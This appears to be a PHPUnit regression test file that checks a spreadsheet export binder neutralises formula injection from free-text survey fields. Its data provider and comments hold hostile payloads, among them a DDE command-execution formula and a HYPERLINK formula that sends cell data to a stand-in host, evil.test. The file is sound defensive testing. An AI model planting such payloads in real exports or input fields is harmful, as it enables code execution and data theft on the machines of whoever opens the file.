<?php

namespace Tests\Feature;

use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Regression tests for formula injection in exported spreadsheets.
 *
 * The data exports carry free text typed by enumerators in the field —
 * respondent_name, institution names, settlement names — and PhpSpreadsheet's
 * default binder turns any string starting with "=" into a live formula. A
 * household respondent named "=cmd|'/c calc'!A1" therefore becomes code that
 * runs on the machine of whichever municipal officer opens the download.
 *
 * Verified before fixing: the stock binder returns DataType::TYPE_FORMULA for
 * those strings. App\Exports\SafeStringValueBinder is registered globally in
 * AppServiceProvider, so these tests boot the application rather than
 * constructing the binder directly — if the registration is ever dropped, they
 * fail, which is the point.
 *
 * Unlike raw CSV this only concerns "="; @ - + tab and CR are already inert in
 * xlsx. The CSV side is covered by CsvInjectionTest.
 */
class SpreadsheetFormulaInjectionTest extends TestCase
{
    private function bind(string $value): string
    {
        $sheet = (new Spreadsheet())->getActiveSheet();
        $sheet->setCellValue('A1', $value);

        return $sheet->getCell('A1')->getDataType();
    }

    #[DataProvider('formulaTriggers')]
    public function test_formula_text_is_stored_as_an_inert_string(string $payload): void
    {
        $this->assertSame(
            DataType::TYPE_STRING,
            $this->bind($payload),
            'Must not bind as a formula — it would execute on open.'
        );
    }

    public static function formulaTriggers(): array
    {
        return [
            'simple formula' => ['=1+1'],
            'DDE command execution' => ["=cmd|'/c calc'!A1"],
            'hyperlink exfiltration' => ['=HYPERLINK("http://evil.test?d="&A1,"click")'],
            'cell reference' => ['=A1'],
            'nested call' => ['=SUM(1,2)'],
            'devanagari after trigger' => ['=राम बहादुर'],
        ];
    }

    /** The value must survive intact — this protects data, it does not discard it. */
    public function test_the_original_text_is_preserved_exactly(): void
    {
        $payload = "=cmd|'/c calc'!A1";
        $sheet = (new Spreadsheet())->getActiveSheet();
        $sheet->setCellValue('A1', $payload);

        $this->assertSame($payload, $sheet->getCell('A1')->getValue());
    }

    /**
     * The binder must not flatten everything to text — numbers and dates still
     * need their types or the exports become unusable for analysis.
     */
    #[DataProvider('ordinaryValues')]
    public function test_ordinary_values_keep_their_natural_type(mixed $value, string $expectedType): void
    {
        $this->assertSame($expectedType, $this->bind((string) $value));
    }

    public static function ordinaryValues(): array
    {
        return [
            'negative number' => ['-42', DataType::TYPE_NUMERIC],
            'positive number' => ['1234', DataType::TYPE_NUMERIC],
            'decimal' => ['12.5', DataType::TYPE_NUMERIC],
            'at sign is inert in xlsx' => ['@SUM(A1:A9)', DataType::TYPE_STRING],
            'devanagari name' => ['राम बहादुर श्रेष्ठ', DataType::TYPE_STRING],
            'unique code' => ['HH-0001-W05-00042', DataType::TYPE_STRING],
        ];
    }

    /**
     * No export writes a real formula — every setCellValue() in app/Exports is
     * static help text. That is what makes a global binder safe; if an export
     * ever needs a formula it must bind it explicitly.
     */
    public function test_no_export_class_writes_a_formula(): void
    {
        $offenders = [];

        foreach (glob(base_path('app/Exports/*.php')) + glob(base_path('app/Exports/*/*.php')) as $file) {
            foreach (file($file) as $i => $line) {
                if (preg_match('/setCellValue\w*\(\s*[^,]+,\s*[\'"]=/', $line)) {
                    $offenders[] = basename($file).':'.($i + 1);
                }
            }
        }

        $this->assertSame([], $offenders,
            "An export writes a formula, which the global SafeStringValueBinder now blocks:\n  "
            .implode("\n  ", $offenders));
    }
}
